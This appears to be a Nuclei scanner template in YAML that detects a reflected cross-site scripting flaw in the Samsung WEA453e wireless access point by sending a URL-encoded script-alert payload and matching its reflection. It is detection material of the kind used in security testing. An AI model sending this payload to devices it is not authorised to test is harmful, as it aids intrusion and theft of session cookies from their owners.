http:
- matchers:
  - part: body
    type: word
    words:
    - /tmp/www/<script>alert(document.domain)</script>
  - status:
    - 404
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/%3Cscript%3Ealert(document.domain)%3C/script%3E'
id: samsung-wlan-ap-xss
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: Samsung WLAN AP WEA453e router contains a cross-site scripting vulnerability.
    An attacker can execute arbitrary script and thus steal cookie-based authentication
    credentials and launch other attacks.
  metadata:
    max-request: 1
  name: Samsung WLAN AP WEA453e - Cross-Site Scripting
  reference:
  - https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
  severity: high
  tags: xss,samsung
